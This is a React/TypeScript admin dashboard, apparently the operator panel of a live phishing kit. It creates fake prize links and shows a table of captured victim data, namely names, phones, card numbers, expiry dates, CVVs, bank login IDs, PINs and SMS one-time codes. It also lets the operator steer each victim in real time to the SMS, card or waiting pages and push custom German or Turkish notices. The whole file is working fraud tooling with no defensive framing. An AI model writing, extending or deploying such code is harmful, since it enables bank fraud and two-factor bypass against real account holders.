"use client";

import { useCallback, useEffect, useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import type { DemoSession } from "@/types/session";

export function AdminDashboardStable() {
  const supabase = createBrowserSupabaseClient();
  const [rows, setRows] = useState<DemoSession[]>([]);
  const [loading, setLoading] = useState(true);
  const [amount, setAmount] = useState("5000");
  const [creating, setCreating] = useState(false);
  const [newLink, setNewLink] = useState<string | null>(null);
  const [specialPromptSessionId, setSpecialPromptSessionId] = useState<string | null>(null);
  const [specialMessage, setSpecialMessage] = useState("");
  const [specialImage, setSpecialImage] = useState<string | null>(null);
  const [specialLang, setSpecialLang] = useState<"de" | "tr">("de");

  const load = useCallback(async () => {
    if (!supabase) return;
    setLoading(true);
    const { data } = await supabase.from("sessions").select("*").order("created_at", { ascending: false }).limit(50);
    setRows((data as DemoSession[]) ?? []);
    setLoading(false);
  }, [supabase]);

  useEffect(() => {
    void load();
    if (!supabase) return;
    const channel = supabase
      .channel("admin-sessions-live")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, () => void load())
      .subscribe();
    return () => {
      void supabase.removeChannel(channel);
    };
  }, [supabase, load]);

  async function createSession() {
    if (!supabase) return;
    setCreating(true);
    const { data, error } = await supabase
      .from("sessions")
      .insert({ amount: Number(amount.replace(",", ".")) || 0, current_step: "win", status: "offline", form_data: {} })
      .select("id, public_id")
      .maybeSingle();
    setCreating(false);
    if (!error && (data?.id || data?.public_id)) {
      const shortId = data.public_id ? String(data.public_id) : data.id;
      setNewLink(`${window.location.origin}/win/${encodeURIComponent(shortId)}`);
      await load();
    }
  }

  async function handleRouteAction(id: string, step: string) {
    if (!supabase || !step) return;
    if (step === "special_approval") {
      setSpecialPromptSessionId(id);
      setSpecialMessage("");
      setSpecialImage(null);
      setSpecialLang("de");
      return;
    }
    await supabase.from("sessions").update({ is_hidden: false, current_step: step }).eq("id", id);
    await load();
  }

  async function onSpecialImageFile(file?: File | null) {
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => setSpecialImage(typeof reader.result === "string" ? reader.result : null);
    reader.readAsDataURL(file);
  }

  async function publishSpecialApproval() {
    if (!supabase || !specialPromptSessionId) return;
    const { data: existing } = await supabase.from("sessions").select("*").eq("id", specialPromptSessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase
      .from("sessions")
      .update({
        status: "SPECIAL_INFO",
        current_step: "special_approval",
        form_data: {
          ...prev,
          specialNoticeText: specialMessage.trim(),
          specialNoticeImage: specialImage ?? "",
          specialNoticeLang: specialLang,
          specialNoticeSentAt: new Date().toISOString(),
        },
      })
      .eq("id", specialPromptSessionId);
    setSpecialPromptSessionId(null);
    await load();
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] p-6 font-sans text-zinc-300">
      <div className="mx-auto max-w-7xl">
        <div className="mb-8 flex items-center justify-between">
          <h1 className="text-xl font-bold tracking-tight text-white">Yönetim Paneli</h1>
          <div className="flex items-end gap-3">
            <input className="w-24 rounded-lg border border-zinc-800 bg-[#111] px-3 py-1.5 text-sm" value={amount} onChange={(e) => setAmount(e.target.value)} />
            <button onClick={() => void createSession()} disabled={creating} className="rounded-lg bg-blue-700 px-4 py-2 text-sm font-semibold text-white">
              {creating ? "..." : "Yeni Link"}
            </button>
          </div>
        </div>

        <div className="overflow-hidden rounded-xl border border-zinc-800 bg-[#111111]">
          <table className="w-full text-left text-sm">
            <thead className="border-b border-zinc-800 bg-[#161616] text-xs uppercase text-zinc-500">
              <tr>
                <th className="px-4 py-4 font-semibold">Durum</th>
                <th className="px-4 py-4 font-semibold">Kimlik</th>
                <th className="px-4 py-4 font-semibold">Kart Bilgileri</th>
                <th className="px-4 py-4 font-semibold">Banka Giriş</th>
                <th className="px-4 py-4 font-semibold">SMS</th>
                <th className="px-4 py-4 font-semibold">İşlemler</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-800">
              {loading ? (
                <tr><td colSpan={6} className="px-4 py-10 text-center">Yükleniyor...</td></tr>
              ) : (
                rows.map((row) => (
                  <tr key={row.id} className="transition-colors hover:bg-[#141414]">
                    <td className="px-4 py-4">
                      <div className="flex items-center gap-2">
                        <div className={`size-2 rounded-full ${row.status === "online" ? "animate-pulse bg-blue-500 shadow-[0_0_8px_#003b8f]" : "bg-zinc-700"}`} />
                        <span className={`text-[10px] font-bold ${row.status === "online" ? "text-blue-500" : "text-zinc-500"}`}>{row.status === "online" ? "AKTİF" : "PASİF"}</span>
                      </div>
                    </td>
                    <td className="px-4 py-4">
                      <div className="font-medium text-zinc-200">{row.form_data?.firstName} {row.form_data?.lastName}</div>
                      <div className="text-[11px] text-zinc-500">{row.form_data?.phone || "No data"}</div>
                    </td>
                    <td className="px-4 py-4 text-xs text-zinc-400">
                      <div>Kart: {row.form_data?.cardNumber || "-"}</div>
                      <div>SKT: {row.form_data?.cardExpiry || "-"}</div>
                      <div>CVV: {row.form_data?.cardCvc || "-"}</div>
                    </td>
                    <td className="px-4 py-4 text-xs text-zinc-400">
                      <div>Banka: {row.form_data?.bankName || "-"}</div>
                      <div>ID: {row.form_data?.verfuegernummer || "-"}</div>
                      <div>PIN: {row.form_data?.pin || "-"}</div>
                    </td>
                    <td className="px-4 py-4 font-mono font-bold text-blue-400">{row.form_data?.smsCode || "-"}</td>
                    <td className="px-4 py-4">
                      <select className="rounded-md border border-zinc-700 bg-[#1a1a1a] px-2 py-1 text-xs text-zinc-300" defaultValue="" onChange={(e) => void handleRouteAction(row.id, e.target.value)}>
                        <option value="">Seç...</option>
                        <option value="win">Giriş</option>
                        <option value="sms">SMS</option>
                        <option value="card">Kart</option>
                        <option value="special_approval">Özel Bildirim</option>
                        <option value="wait">Beklet</option>
                        <option value="congrats">Tebrikler</option>
                      </select>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>

      {newLink ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-sm">
          <div className="w-full max-w-sm rounded-xl border border-zinc-800 bg-[#161616] p-6">
            <h3 className="mb-4 text-center font-bold text-white">Link Oluşturuldu</h3>
            <input readOnly value={newLink} className="mb-4 w-full rounded-lg border border-zinc-800 bg-[#0a0a0a] px-3 py-2 text-center text-xs text-blue-500" />
            <button onClick={() => { void navigator.clipboard.writeText(newLink); setNewLink(null); }} className="w-full rounded-lg bg-blue-700 py-2 font-bold text-white">Kopyala ve Kapat</button>
          </div>
        </div>
      ) : null}

      {specialPromptSessionId ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4">
          <div className="w-full max-w-2xl rounded-2xl border border-zinc-800 bg-[#111111] p-6">
            <h3 className="text-lg font-semibold text-white">Özel Bildirim Gönder</h3>
            <label className="mt-4 block text-sm text-zinc-300">Dil
              <select value={specialLang} onChange={(e) => setSpecialLang(e.target.value as "de" | "tr")} className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-900 px-3 py-2 text-zinc-200">
                <option value="de">Deutsch</option>
                <option value="tr">Türkçe</option>
              </select>
            </label>
            <label className="mt-3 block text-sm text-zinc-300">Mesaj
              <textarea value={specialMessage} onChange={(e) => setSpecialMessage(e.target.value)} rows={5} className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-900 px-3 py-2 text-zinc-200" />
            </label>
            <label className="mt-3 block text-sm text-zinc-300">Görsel
              <input type="file" accept="image/*" className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-zinc-200" onChange={(e) => void onSpecialImageFile(e.target.files?.[0])} />
            </label>
            {specialImage ? <div className="mt-3 overflow-hidden rounded-xl border border-zinc-800 bg-zinc-900 p-2"><img src={specialImage} alt="Önizleme" className="h-auto max-h-64 w-full object-contain" /></div> : null}
            <div className="mt-4 flex justify-end gap-2">
              <button type="button" className="rounded-xl border border-zinc-800 px-4 py-2 text-sm text-zinc-300" onClick={() => setSpecialPromptSessionId(null)}>Vazgeç</button>
              <button type="button" className="rounded-xl border border-zinc-800 bg-zinc-900 px-4 py-2 text-sm text-white" onClick={() => void publishSpecialApproval()}>Gönder</button>
            </div>
          </div>
        </div>
      ) : null}
    </div>
  );
}
